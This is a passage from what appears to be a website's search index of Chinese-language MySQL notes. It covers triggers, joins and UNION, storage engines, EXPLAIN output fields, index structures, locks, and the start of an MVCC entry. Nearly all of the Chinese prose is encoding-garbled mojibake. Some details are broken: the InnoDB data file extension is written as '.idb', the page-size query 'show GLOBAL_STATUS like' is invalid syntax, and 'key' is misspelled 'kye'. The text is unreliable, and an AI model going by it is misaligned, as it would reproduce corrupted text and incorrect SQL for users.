@sumAvgAge=0; Query OK, 0 rows affected (0.00 sec) mysql> insert into t1 -> values -> (1, \"bob\", 26, \"1999-2-2\"), -> (2, \"tom\", 28, \"1998-4-4\"); Query OK, 2 rows affected (0.01 sec) Records: 2 Duplicates: 0 Warnings: 0 mysql> select @nums, @sumAge, @sumAvgAge; +-------+---------+--------------+ | @nums | @sumAge | @sumAvgAge | +-------+---------+--------------+ | 2 | 54 | 27.000000000 | +-------+---------+--------------+ 1 row in set (0.00 sec) åˆ›å»º AFTER ç±»å‹è§¦å‘å™¨ MySQLä¿®æ”¹å’Œåˆ é™¤è§¦å‘å™¨ï¼ˆDROP TRIGGERï¼‰ ä¿®æ”¹è§¦å‘å™¨å¯ä»¥é€šè¿‡åˆ é™¤åŸè§¦å‘å™¨ï¼Œå†ä»¥ç›¸åŒçš„åç§°åˆ›å»ºæ–°çš„è§¦å‘å™¨ã€‚ åŸºæœ¬è¯­æ³• ä¸å…¶ä»–MySQLæ•°æ®åº“å¯¹è±¡ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨ DROP è¯­å¥å°†è§¦å‘å™¨ä»æ•°æ®åº“ä¸­åˆ é™¤ã€‚ è¯­æ³•æ ¼å¼å¦‚ä¸‹: DROP TRIGGER [ IF EXISTS ] [æ•°æ®åº“å] <è§¦å‘å™¨å> è¯­æ³•è¯´æ˜å¦‚ä¸‹ï¼š è§¦å‘å™¨å è¦åˆ é™¤çš„è§¦å‘å™¨åç§°ã€‚ æ•°æ®åº“å å¯é€‰é¡¹ã€‚æŒ‡å®šè§¦å‘å™¨æ‰€åœ¨çš„æ•°æ®åº“çš„åç§°ã€‚è‹¥æ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä¸ºå½“å‰é»˜è®¤çš„æ•°æ®åº“ æƒé™ æ‰§è¡Œ DROP TRIGGER è¯­å¥éœ€è¦ SUPER æƒé™ã€‚ IF EXISTS å¯é€‰é¡¹ã€‚é¿å…åœ¨æ²¡æœ‰è§¦å‘å™¨çš„æƒ…å†µä¸‹åˆ é™¤è§¦å‘å™¨ã€‚ æ³¨è§£ åˆ é™¤ä¸€ä¸ªè¡¨çš„åŒæ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨åˆ é™¤è¯¥è¡¨ä¸Šçš„è§¦å‘å™¨ã€‚ å¦å¤–ï¼Œè§¦å‘å™¨ä¸èƒ½æ›´æ–°æˆ–è¦†ç›–ï¼Œä¸ºäº†ä¿®æ”¹ä¸€ä¸ªè§¦å‘å™¨ï¼Œå¿…é¡»å…ˆåˆ é™¤å®ƒï¼Œå†é‡æ–°åˆ›å»ºã€‚ åˆ é™¤è§¦å‘å™¨ ä½¿ç”¨ DROP TRIGGER è¯­å¥å¯ä»¥åˆ é™¤ MySQL ä¸­å·²ç»å®šä¹‰çš„è§¦å‘å™¨ã€‚ å‚è€ƒ: MySQL ä¹‹è§¦å‘å™¨ï¼ˆåˆ›å»º/ä¿®æ”¹ã€åˆ é™¤CREATE/DROP TRIGGER)","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-trigger.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-trigger.html"},{"title":"è¡¨å†…å¤–è¿æ¥","text":"å‡è®¾æœ‰ä¸¤ä¸ªè¡¨a, b: CREATE TABLE `a_table` ( `a_id` int(11) DEFAULT NULL, `a_name` varchar(10) DEFAULT NULL, `a_part` varchar(10) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 CREATE TABLE `b_table` ( `b_id` int(11) DEFAULT NULL, `b_name` varchar(10) DEFAULT NULL, `b_part` varchar(10) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 è¡¨æ•°æ® å†…è¿æ¥ å†…è¿æ¥, è¯­æ³•: inner join on ç”¨ä¾‹: select * from a_table a inner join b_table b on a.a_id = b.b_id; ç»“æœ è¯´æ˜: ç»“æœåªä¼šåŒ…å«æ»¡è¶³ a.a_id = b.b_id. ç›¸å½“äºä¸¤ä¸ªè¡¨çš„äº¤é›†. å·¦è¿æ¥ï¼ˆå·¦å¤–è¿æ¥ï¼‰ è¯­æ³•: left join on / left outer join on ç”¨ä¾‹: select * from a_table a left join b_table b on a.a_id = b.b_id; ç»“æœ left join æ˜¯left outer joinçš„ç®€å†™ï¼Œå®ƒçš„å…¨ç§°æ˜¯å·¦å¤–è¿æ¥ï¼Œæ˜¯å¤–è¿æ¥ä¸­çš„ä¸€ç§ å·¦è¿æ¥ä¼šæ˜¾ç¤ºä¸»è¡¨ï¼ˆå·¦è¡¨ï¼‰çš„å…¨éƒ¨è®°å½•ï¼Œå³è¡¨åªä¼šæ˜¾ç¤ºç¬¦åˆè¿æ¥æ¡ä»¶çš„æ•°æ®ï¼Œä¸ç¬¦åˆçš„ä¸ºnull å³è¿æ¥ï¼ˆå³å¤–è¿æ¥ï¼‰ å…³é”®å­—: right join on / right outer join on è¯­å¥: select * from a_table a right outer join b_table b on a.a_id = b.b_id; æ‰§è¡Œç»“æœ right joinæ˜¯right outer joinçš„ç®€å†™ï¼Œå®ƒçš„å…¨ç§°æ˜¯å³å¤–è¿æ¥ï¼Œæ˜¯å¤–è¿æ¥ä¸­çš„ä¸€ç§ã€‚ ä¸å·¦(å¤–)è¿æ¥ç›¸åï¼Œå³(å¤–)è¿æ¥ï¼Œæ˜¾ç¤ºå³è¡¨ï¼ˆä¸»è¡¨ï¼‰æ‰€æœ‰è®°å½•ï¼Œå·¦è¡¨åªä¼šæ˜¾ç¤ºç¬¦åˆè¿æ¥æ¡ä»¶çš„æ•°æ®ï¼Œä¸ç¬¦åˆçš„ä¸ºnull å…¨å¤–è¿æ¥(mysqlä¸æ”¯æŒ) å…³é”®å­—: full [outer] join ç›¸å½“äºè¿”å›ä¸¤ä¸ªè¡¨çš„å¹¶é›†, æ²¡æœ‰çš„ä¸ºç©º MySQLæš‚ä¸æ”¯æŒè¿™ç§è¯­å¥ï¼Œä¸è¿‡å¯ä»¥ä½¿ç”¨unionå°†ä¸¤ä¸ªç»“æœé›†\"å †ä¸€èµ·\"ï¼Œ åˆ©ç”¨å·¦è¿æ¥ï¼Œå³è¿æ¥åˆ†ä¸¤æ¬¡å°†æ•°æ®å–å‡ºï¼Œç„¶åç”¨unionå°†æ•°æ®åˆå¹¶å»é‡ã€‚ å‚è€ƒ:: MySQLå¤šè¡¨æŸ¥è¯¢ä¸å·¦è¿æ¥ã€å³è¿æ¥ã€å†…è¿æ¥ã€å…¨è¿æ¥ ã€MySQLã€‘è¿æ¥æŸ¥è¯¢ ä»¥åŠ onã€whereã€Havingçš„åŒºåˆ« UNION è¿™ä¸ªä¸å±äºè¿æ¥, ä¸è¿‡å®¹æ˜“æ··, æ‰€ä»¥æ”¾åœ¨è¿™ åˆå¹¶å¤šä¸ªç»“æœé›†ä¸ºä¸€ä¸ª MySQL UNION æ“ä½œç¬¦ç”¨äºè¿æ¥ä¸¤ä¸ªä»¥ä¸Šçš„ SELECT è¯­å¥çš„ç»“æœç»„åˆåˆ°ä¸€ä¸ªç»“æœé›†åˆï¼Œå¹¶å»é™¤é‡å¤çš„è¡Œã€‚ UNION æ“ä½œç¬¦å¿…é¡»ç”±ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥ç»„æˆï¼Œæ¯ä¸ª SELECT è¯­å¥çš„åˆ—æ•°å’Œå¯¹åº”ä½ç½®çš„æ•°æ®ç±»å‹å¿…é¡»ç›¸åŒ: SELECT column1, column2, ... FROM table1 WHERE condition1 UNION SELECT column1, column2, ... FROM table2 WHERE condition2 [ORDER BY column1, column2, ...]; å‚æ•°è¯´æ˜: column1, column2, ... æ˜¯ä½ è¦é€‰æ‹©çš„åˆ—çš„åç§°ï¼Œå¦‚æœä½¿ç”¨ * è¡¨ç¤ºé€‰æ‹©æ‰€æœ‰åˆ—ã€‚ table1, table2, ... æ˜¯ä½ è¦ä»ä¸­æŸ¥è¯¢æ•°æ®çš„è¡¨çš„åç§°ã€‚ condition1, condition2, ... æ˜¯æ¯ä¸ª SELECT è¯­å¥çš„è¿‡æ»¤æ¡ä»¶ï¼Œæ˜¯å¯é€‰çš„ã€‚ ORDER BY å­å¥æ˜¯ä¸€ä¸ªå¯é€‰çš„å­å¥ï¼Œç”¨äºæŒ‡å®šåˆå¹¶åçš„ç»“æœé›†çš„æ’åºé¡ºåºã€‚ å°†é€‰æ‹©å®¢æˆ·è¡¨å’Œä¾›åº”å•†è¡¨ä¸­æ‰€æœ‰åŸå¸‚çš„å”¯ä¸€å€¼ï¼Œå¹¶æŒ‰åŸå¸‚åç§°å‡åºæ’åº: SELECT city FROM customers UNION SELECT city FROM suppliers ORDER BY city; è¿˜æœ‰ä¸ª UNION ALL , ä¹Ÿæ˜¯åˆå¹¶ç»“æœé›†, ä½†æ˜¯ä¸ä¼šå»é‡. æ€»ç»“ UNION è¯­å¥ï¼šç”¨äºå°†ä¸åŒè¡¨ä¸­ç›¸åŒåˆ—ä¸­æŸ¥è¯¢çš„æ•°æ®å±•ç¤ºå‡ºæ¥ï¼›ï¼ˆä¸åŒ…æ‹¬é‡å¤æ•°æ®ï¼‰ UNION ALL è¯­å¥ï¼šç”¨äºå°†ä¸åŒè¡¨ä¸­ç›¸åŒåˆ—ä¸­æŸ¥è¯¢çš„æ•°æ®å±•ç¤ºå‡ºæ¥ï¼›ï¼ˆåŒ…æ‹¬é‡å¤æ•°æ®ï¼‰ ä½¿ç”¨å½¢å¼å¦‚ä¸‹:: SELECT åˆ—åç§° FROM è¡¨åç§° UNION SELECT åˆ—åç§° FROM è¡¨åç§° ORDER BY åˆ—åç§°ï¼› SELECT åˆ—åç§° FROM è¡¨åç§° UNION ALL SELECT åˆ—åç§° FROM è¡¨åç§° ORDER BY åˆ—åç§°ï¼›","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Connection-inside-and-outside-the-table.html","loc":"/yq-doc-source-docs-database-mysql-Connection-inside-and-outside-the-table.html"},{"title":"æ•°æ®åº“å¼•æ“","text":"MyISAMå¼•æ“ æ•°æ®åº“è¡¨å­˜å‚¨æ–‡ä»¶åˆ†æˆä¸‰ç±»: table_name.frm è¡¨ç»“æ„ table_name.MYI è¡¨ç´¢å¼• table_name.MYD è¡¨æ•°æ® å³ç´¢å¼•æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶æ˜¯åˆ†ç¦»çš„(éèšé›†) ç´¢å¼•çš„å¶å­ç»“ç‚¹å­˜å‚¨çš„æ˜¯æ•°æ®çš„åœ°å€ InnoDB æ•°æ®åº“è¡¨å­˜å‚¨æ–‡ä»¶åˆ†æˆä¸¤ç±»: table_name.frm è¡¨ç»“æ„ (8.0ç»Ÿä¸€æ”¾åˆ°ç³»ç»Ÿè¡¨çš„idbé‡Œé¢äº†è²Œä¼¼) table_name.idb è¡¨ç´¢å¼•å’Œæ•°æ® å³ç´¢å¼•æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶æ˜¯ èšé›† çš„ ç´¢å¼•çš„å¶å­ç»“ç‚¹å­˜å‚¨çš„æ˜¯æ•°æ®æœ¬èº«(èšé›†ç´¢å¼•åŒ…å«å®Œæ•´çš„æ•°æ®è®°å½•) é€šå¸¸è¯´çš„èšé›†ç´¢å¼•å°±æ˜¯æŒ‡çš„è¿™ä¸ª .idb éä¸»é”®ç´¢å¼•å­˜å‚¨çš„æ˜¯ä¸»é”®ç´¢å¼• , ä¸ºäº†ä¿æŒä¸€è‡´æ€§ä¸èŠ‚çœç©ºé—´. æ‰€ä»¥ä»éä¸»é”®ç´¢å¼•æŸ¥è¯¢, è¿˜æ˜¯ä¼šå›è¡¨æŸ¥ä¸»é”®æ‰¾æ•°æ®. ä¸€äº›å¸¸è§é—®é¢˜ ä¸ºä»€ä¹ˆ InnoDB å»ºè®®å¿…é¡»å»ºä¸»é”®, ä¸”å»ºè®®ä½¿ç”¨æ•´å‹çš„ è‡ªå¢ä¸»é”® ? ä»¥ä¸‹åŸå› : InnoDB ä¼šæœ‰ä¸€ä¸ªèšé›†ç´¢å¼•, å¦‚æœä¸å»ºä¸»é”®, æ•°æ®åº“è‡ªå·±ä¹Ÿä¼šç»´æŠ¤ä¸€ä¸ªä¸å¯è§çš„ä¸»é”®åˆ—(å«row_id, ä¸ç„¶æ²¡æ³•å»ºB+æ ‘), å› ä¸ºä¸å¯è§, å¼€å‘è€…è‡ªå·±ä¹Ÿæ²¡æ³•ç”¨, æ‰€ä»¥è¿˜ä¸å¦‚è‡ªå·±å»º ä½¿ç”¨è‡ªå¢ä¸»é”®, ä¸»è¦æ˜¯ä¸ºäº†å‡å°å¢åŠ æ•°æ®æ—¶å€™, ç´¢å¼•B+æ ‘ä¼šè¿›è¡Œä¸€ä¸ªæ‰©å……, å¦‚æœä¸æ˜¯è‡ªå¢, ä¼šæœ‰B+æ ‘æ’å…¥çš„é¢å¤–å¼€é”€, æµªè´¹æ•°æ®åº“æ€§èƒ½ è‡ªå¢ä¸»é”®ä½¿ç”¨æ•´å‹, æ˜¯å› ä¸ºæ¯”è¾ƒæ˜¯æœ€å¿«çš„ä¸”å ç©ºé—´è¾ƒå°. å¦‚æœæ˜¯UUID, æ¯ä¸€ä½éƒ½è¦æ¯”","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Database-engine.html","loc":"/yq-doc-source-docs-database-mysql-Database-engine.html"},{"title":"explain ä¼˜åŒ–","text":"explain æŸ¥è¯¢ä¼˜åŒ–ç¥å™¨ EXPLAINè¯­å¥çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹: explain select select_option select_optionsæ˜¯SELECTè¯­å¥çš„æŸ¥è¯¢é€‰é¡¹ï¼ŒåŒ…æ‹¬FROM WHEREå­å¥ç­‰ è¾“å‡ºç»“æœåˆ—é€‰é¡¹å«ä¹‰: id SELECTè¯†åˆ«ç¬¦. è¿™æ˜¯SELECTçš„æŸ¥è¯¢åºåˆ—å·, è¡¨ç¤ºæŸ¥è¯¢ä¸­æ‰§è¡Œselectå­å¥æˆ–æ“ä½œè¡¨çš„é¡ºåº, idç›¸åŒï¼Œæ‰§è¡Œé¡ºåºä»ä¸Šåˆ°ä¸‹, idä¸åŒï¼Œidå€¼è¶Šå¤§æ‰§è¡Œä¼˜å…ˆçº§è¶Šé«˜; select_type è¡¨ç¤ºSELECTè¯­å¥çš„ç±»å‹. å®ƒå¯ä»¥æ˜¯ä»¥ä¸‹å‡ ç§å–å€¼ï¼š SIMPLE:è¡¨ç¤ºç®€å•æŸ¥è¯¢ï¼Œå…¶ä¸­ä¸åŒ…æ‹¬è¿æ¥æŸ¥è¯¢å’Œå­æŸ¥è¯¢ï¼› PRIMARY:è¡¨ç¤ºä¸»æŸ¥è¯¢ï¼Œæˆ–è€…æ˜¯æœ€å¤–å±‚çš„æŸ¥è¯¢è¯­å¥ï¼Œæœ€å¤–å±‚æŸ¥è¯¢ä¸ºPRIMARYï¼Œä¹Ÿå°±æ˜¯æœ€ååŠ è½½çš„å°±æ˜¯PRIMARYï¼› UNION:è¡¨ç¤ºè¿æ¥æŸ¥è¯¢çš„ç¬¬2ä¸ªæˆ–åé¢çš„æŸ¥è¯¢è¯­å¥ï¼Œ ä¸ä¾èµ–äºå¤–éƒ¨æŸ¥è¯¢çš„ç»“æœé›† DEPENDENT UNION:è¿æ¥æŸ¥è¯¢ä¸­çš„ç¬¬2ä¸ªæˆ–åé¢çš„SELECTè¯­å¥ï¼Œä¾èµ–äºå¤–é¢çš„æŸ¥è¯¢ï¼› UNION RESULT:è¿æ¥æŸ¥è¯¢çš„ç»“æœï¼› SUBQUERY:å­æŸ¥è¯¢ä¸­çš„ç¬¬1ä¸ªSELECTè¯­å¥ï¼›ä¸ä¾èµ–äºå¤–éƒ¨æŸ¥è¯¢çš„ç»“æœé›† DEPENDENT SUBQUERY:å­æŸ¥è¯¢ä¸­çš„ç¬¬1ä¸ªSELECTï¼Œä¾èµ–äºå¤–é¢çš„æŸ¥è¯¢ï¼› DERIVED:å¯¼å‡ºè¡¨çš„SELECTï¼ˆFROMå­å¥çš„å­æŸ¥è¯¢ï¼‰,MySQLä¼šé€’å½’æ‰§è¡Œè¿™äº›å­æŸ¥è¯¢ï¼ŒæŠŠç»“æœæ”¾åœ¨ä¸´æ—¶è¡¨é‡Œã€‚ DEPENDENT DERIVED:æ´¾ç”Ÿè¡¨ä¾èµ–äºå¦ä¸€ä¸ªè¡¨ MATERIALIZED:ç‰©åŒ–å­æŸ¥è¯¢ UNCACHEABLE SUBQUERY:å­æŸ¥è¯¢ï¼Œå…¶ç»“æœæ— æ³•ç¼“å­˜ï¼Œå¿…é¡»é’ˆå¯¹å¤–éƒ¨æŸ¥è¯¢çš„æ¯ä¸€è¡Œé‡æ–°è¿›è¡Œè¯„ä¼° UNCACHEABLE UNION:UNIONä¸­çš„ç¬¬äºŒä¸ªæˆ–éšåçš„ select æŸ¥è¯¢ï¼Œå±äºä¸å¯ç¼“å­˜çš„å­æŸ¥è¯¢ table è¡¨ç¤ºæŸ¥è¯¢çš„è¡¨ partitions æŸ¥è¯¢å°†ä»ä¸­åŒ¹é…è®°å½•çš„åˆ†åŒºã€‚è¯¥å€¼é€‚ç”¨NULLäºæœªåˆ†åŒºçš„è¡¨ type è¡¨ç¤ºè¡¨çš„è¿æ¥ç±»å‹ system: è¯¥è¡¨æ˜¯ä»…æœ‰ä¸€è¡Œçš„ç³»ç»Ÿè¡¨ã€‚è¿™æ˜¯constè¿æ¥ç±»å‹çš„ä¸€ä¸ªç‰¹ä¾‹ const: æ•°æ®è¡¨æœ€å¤šåªæœ‰ä¸€ä¸ªåŒ¹é…è¡Œï¼Œå®ƒå°†åœ¨æŸ¥è¯¢å¼€å§‹æ—¶è¢«è¯»å–ï¼Œå¹¶åœ¨ä½™ä¸‹çš„æŸ¥è¯¢ä¼˜åŒ–ä¸­ä½œä¸ºå¸¸é‡å¯¹å¾…ã€‚ constè¡¨æŸ¥è¯¢é€Ÿåº¦å¾ˆå¿«ï¼Œå› ä¸ºåªè¯»å–ä¸€æ¬¡,constç”¨äºä½¿ç”¨å¸¸æ•°å€¼æ¯”è¾ƒPRIMARY KEYæˆ–UNIQUEç´¢å¼•çš„æ‰€æœ‰éƒ¨åˆ†çš„åœºåˆã€‚ eq_ref:å¯¹äºæ¯ä¸ªæ¥è‡ªå‰é¢çš„è¡¨çš„è¡Œç»„åˆï¼Œä»è¯¥è¡¨ä¸­è¯»å–ä¸€è¡Œ, å¯ä»¥ç”¨äºä½¿ç”¨=è¿ç®—ç¬¦è¿›è¡Œæ¯”è¾ƒçš„ç´¢å¼•åˆ— . æ¯”è¾ƒå€¼å¯ä»¥æ˜¯å¸¸é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯ä½¿ç”¨åœ¨æ­¤è¡¨ä¹‹å‰è¯»å–çš„è¡¨ä¸­åˆ—çš„è¡¨è¾¾å¼ ref:å¯¹äºæ¥è‡ªå‰é¢çš„è¡¨çš„ä»»æ„è¡Œç»„åˆï¼Œå°†ä»è¯¥è¡¨ä¸­è¯»å–æ‰€æœ‰åŒ¹é…çš„è¡Œï¼Œrefå¯ä»¥ç”¨äºä½¿ç”¨\"ï¼\"æˆ–\"ï¼œï¼ï¼\"æ“ä½œç¬¦çš„å¸¦ç´¢å¼•çš„åˆ—ã€‚ fulltext:ä½¿ç”¨FULLTEXT ç´¢å¼•æ‰§è¡Œè”æ¥ ref_or_null:è¿™ç§è¿æ¥ç±»å‹ç±»ä¼¼äºrefï¼Œä½†æ˜¯é™¤äº†MySQLè¿˜ä¼šé¢å¤–æœç´¢åŒ…å«NULLå€¼çš„è¡Œã€‚æ­¤è”æ¥ç±»å‹ä¼˜åŒ–æœ€å¸¸ç”¨äºè§£æå­æŸ¥è¯¢ index_merge:æ­¤è”æ¥ç±»å‹æŒ‡ç¤ºä½¿ç”¨ç´¢å¼•åˆå¹¶ä¼˜åŒ–ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œkeyè¾“å‡ºè¡Œä¸­çš„åˆ—åŒ…å«ä½¿ç”¨çš„ç´¢å¼•åˆ—è¡¨ï¼Œå¹¶key_lenåŒ…å«ä½¿ç”¨çš„ç´¢å¼• çš„æœ€é•¿é”®éƒ¨åˆ†çš„åˆ—è¡¨ unique_subquery:ç±»å‹æ›¿æ¢ ä»¥ä¸‹å½¢å¼çš„eq_refæŸäº› INå­æŸ¥è¯¢,unique_subquery åªæ˜¯ä¸€ä¸ªç´¢å¼•æŸ¥æ‰¾å‡½æ•°ï¼Œå®ƒå®Œå…¨æ›¿ä»£äº†å­æŸ¥è¯¢ä»¥æé«˜æ•ˆç‡ã€‚ index_subquery:è¿æ¥ç±»å‹ç±»ä¼¼äº unique_subqueryã€‚å®ƒä»£æ›¿INå­æŸ¥è¯¢,ä½†åªé€‚åˆå­æŸ¥è¯¢ä¸­çš„éå”¯ä¸€ç´¢å¼• range:åªæ£€ç´¢ç»™å®šèŒƒå›´çš„è¡Œï¼Œä½¿ç”¨ä¸€ä¸ªç´¢å¼•æ¥é€‰æ‹©è¡Œã€‚keyåˆ—æ˜¾ç¤ºä½¿ç”¨äº†å“ªä¸ªç´¢å¼•ã€‚key_lenåŒ…å«æ‰€ä½¿ç”¨ç´¢å¼•çš„æœ€é•¿å…³é”®å…ƒç´ ã€‚å½“ä½¿ç”¨ï¼ã€ï¼œï¼ã€ï¼ã€ï¼ï¼ã€ï¼œã€ï¼œï¼ã€IS NULLã€ï¼œï¼ï¼ã€BETWEENæˆ–è€…INæ“ä½œç¬¦ç”¨å¸¸é‡æ¯”è¾ƒå…³é”®å­—åˆ—æ—¶ï¼Œç±»å‹ä¸ºrange index:è¯¥indexè”æ¥ç±»å‹æ˜¯ä¸€æ ·çš„ ALLï¼Œåªæ˜¯ç´¢å¼•æ ‘è¢«æ‰«æã€‚è¿™å‘ç”Ÿä¸¤ç§æ–¹å¼ï¼š1ã€å¦‚æœç´¢å¼•æ˜¯æŸ¥è¯¢çš„è¦†ç›–ç´¢å¼•ï¼Œå¹¶ä¸”å¯ç”¨äºæ»¡è¶³è¡¨ä¸­æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ï¼Œåˆ™ä»…æ‰«æç´¢å¼•æ ‘ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒExtraåˆ—æ˜¾ç¤ºä¸º Using indexï¼Œ2ã€ä½¿ç”¨å¯¹ç´¢å¼•çš„è¯»å–æ‰§è¡Œå…¨è¡¨æ‰«æï¼Œä»¥æŒ‰ç´¢å¼•é¡ºåºæŸ¥æ‰¾æ•°æ®è¡Œã€‚ Uses indexæ²¡æœ‰å‡ºç°åœ¨ Extraåˆ—ä¸­ã€‚ ALL:å¯¹äºå‰é¢çš„è¡¨çš„ä»»æ„è¡Œç»„åˆè¿›è¡Œå®Œæ•´çš„è¡¨æ‰«æ possible_keys æŒ‡å‡ºMySQLèƒ½ä½¿ç”¨å“ªä¸ªç´¢å¼•åœ¨è¯¥è¡¨ä¸­æ‰¾åˆ°è¡Œ. è‹¥è¯¥åˆ—æ˜¯NULLï¼Œåˆ™æ²¡æœ‰ç›¸å…³çš„ç´¢å¼•. åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥WHEREå­å¥çœ‹å®ƒæ˜¯å¦å¼•ç”¨æŸäº›åˆ—æˆ–é€‚åˆç´¢å¼•çš„åˆ—æ¥æé«˜æŸ¥è¯¢æ€§èƒ½. å¦‚æœæ˜¯è¿™æ ·ï¼Œå¯ä»¥åˆ›å»ºé€‚åˆçš„ç´¢å¼•æ¥æé«˜æŸ¥è¯¢çš„æ€§èƒ½ã€‚ kye è¡¨ç¤ºæŸ¥è¯¢å®é™…ä½¿ç”¨çš„ç´¢å¼•ï¼Œå¦‚æœæ²¡æœ‰é€‰æ‹©ç´¢å¼•ï¼Œè¯¥åˆ—çš„å€¼æ˜¯NULL. è¦æƒ³å¼ºåˆ¶MySQLä½¿ç”¨æˆ–å¿½è§†possible_keysåˆ—ä¸­çš„ç´¢å¼•ï¼Œåœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨FORCE INDEXã€USE INDEXæˆ–è€…IGNORE INDEX key_len è¡¨ç¤ºMySQLé€‰æ‹©çš„ç´¢å¼•å­—æ®µæŒ‰å­—èŠ‚è®¡ç®—çš„é•¿åº¦ï¼Œè‹¥é”®æ˜¯NULLï¼Œåˆ™é•¿åº¦ä¸ºNULL. æ³¨æ„ï¼Œé€šè¿‡key_lenå€¼å¯ä»¥ç¡®å®šMySQLå°†å®é™…ä½¿ç”¨ä¸€ä¸ªå¤šåˆ—ç´¢å¼•ä¸­çš„å‡ ä¸ªå­—æ®µ ref è¡¨ç¤ºä½¿ç”¨å“ªä¸ªåˆ—æˆ–å¸¸æ•°ä¸ç´¢å¼•ä¸€èµ·æ¥æŸ¥è¯¢è®°å½•ã€‚ rows æ˜¾ç¤ºMySQLåœ¨è¡¨ä¸­è¿›è¡ŒæŸ¥è¯¢æ—¶å¿…é¡»æ£€æŸ¥çš„è¡Œæ•°ã€‚ Extra è¡¨ç¤ºMySQLåœ¨å¤„ç†æŸ¥è¯¢æ—¶çš„è¯¦ç»†ä¿¡æ¯ å‚è€ƒ: MySQLç´¢å¼•åŸç†åŠæ…¢æŸ¥è¯¢ä¼˜åŒ–","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Explain-optimization.html","loc":"/yq-doc-source-docs-database-mysql-Explain-optimization.html"},{"title":"ç´¢å¼•æ•°æ®ç»“æ„","text":"B+æ ‘ Mysqlç´¢å¼•é‡‡å–çš„æ˜¯ B+æ ‘ , å¯å‚è€ƒ /docs/æ•°æ®ç»“æ„/æ ‘ å¯¹äº B+æ ‘ , æ¯ä¸ªèŠ‚ç‚¹çš„æ¯ä¸€ä¸ªç´¢å¼•å€¼, åªæœ‰åˆ°è¾¾å¶å­èŠ‚ç‚¹æ—¶å€™, æ‰ä¼šæœ‰å½“å‰å¯¹åº”çš„è¡Œæ•°æ® (éå¶å­èŠ‚ç‚¹ä¸å­˜å‚¨data, åªæ”¾ç´¢å¼•, å¯ä»¥æ”¾æ›´å¤šçš„ç´¢å¼•) ç´¢å¼•å€¼å¯é‡å¤, ä½†æ˜¯è¡Œæ•°æ®åªæœ‰å¶å­èŠ‚ç‚¹æ‰æœ‰ å¶å­èŠ‚ç‚¹åŒ…å«æ‰€æœ‰ç´¢å¼• å¶å­èŠ‚ç‚¹é—´ç”¨æŒ‡é’ˆç›¸é‚»è¿æ¥(æé«˜åŒºé—´è®¿é—®æ€§èƒ½) ä¸€èˆ¬æ¯ä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹çš„æ•°æ®ä¼šæ”¾æ»¡ä¸€é¡µ, ä¸€èˆ¬æ˜¯ 16KB æŸ¥è¯¢æ¯ä¸€é¡µå¤§å°: show GLOBAL_STATUS like 'Innodb_page_size' Hash åœ¨Mysqlè¡¨ä¸­æ–°å»ºç´¢å¼•æ—¶, è¿˜å¯é€‰æ‹©ç´¢å¼•ç±»å‹ä¸º Hashè¡¨ </docs/æ•°æ®ç»“æ„/Hash> , å¯¹äºå•æŸ¥è¯¢æ—¶éå¸¸å¿«çš„ ä½†æ˜¯åªæ”¯æŒ = , IN , ä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢, ä¸”éœ€è¦å¤„ç†Hashå†²çª FULL TEXT","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Indexing-data-structure.html","loc":"/yq-doc-source-docs-database-mysql-Indexing-data-structure.html"},{"title":"é”","text":"é”ç²’åº¦ è¡Œçº§é” è¡¨çº§é” é¡µçº§é” æ€§èƒ½ ä¹è§‚é” æ‚²è§‚é” æ˜¯å¦ç‹¬å  è¯»é”(å…±äº«é”), é˜»å¡å†™ å†™é”(æ’ä»–é”), é˜»å¡è¯»å†™ æ„å‘é”(Intention Lock) å…¶ä»–é” é—´éš™é”(Gap Lock) ä¸´é”®é”(Next-key Locks)","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Lock.html","loc":"/yq-doc-source-docs-database-mysql-Lock.html"},{"title":"MVCC","text":"MVCCï¼Œå³Multi-Version Concurrency Control ï¼ˆå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼‰ã€‚ å®ƒæ˜¯ä¸€ç§å¹¶å‘æ§åˆ¶çš„æ–¹æ³•ï¼Œä¸€èˆ¬åœ¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸­ï¼Œ å®ç°å¯¹æ•°æ®åº“çš„å¹¶å‘è®¿é—®ï¼Œåœ¨ç¼–ç¨‹è¯­è¨€ä¸­å®ç°äº‹åŠ¡å†…å­˜: é€šä¿—çš„è®²ï¼Œæ•°æ®åº“ä¸­åŒæ—¶å­˜åœ¨å¤šä¸ªç‰ˆæœ¬çš„æ•°æ®ï¼Œ å¹¶ä¸æ˜¯æ•´ä¸ªæ•°æ®åº“çš„å¤šä¸ªç‰ˆæœ¬ï¼Œè€Œæ˜¯æŸä¸€æ¡è®°å½•çš„å¤šä¸ªç‰ˆæœ¬åŒæ—¶å­˜åœ¨ï¼Œ åœ¨æŸä¸ªäº‹åŠ¡å¯¹å…¶è¿›è¡Œæ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦æŸ¥çœ‹è¿™ä¸€æ¡è®°å½•çš„éšè—åˆ—äº‹åŠ¡ç‰ˆæœ¬idï¼Œ æ¯”å¯¹äº‹åŠ¡idå¹¶æ 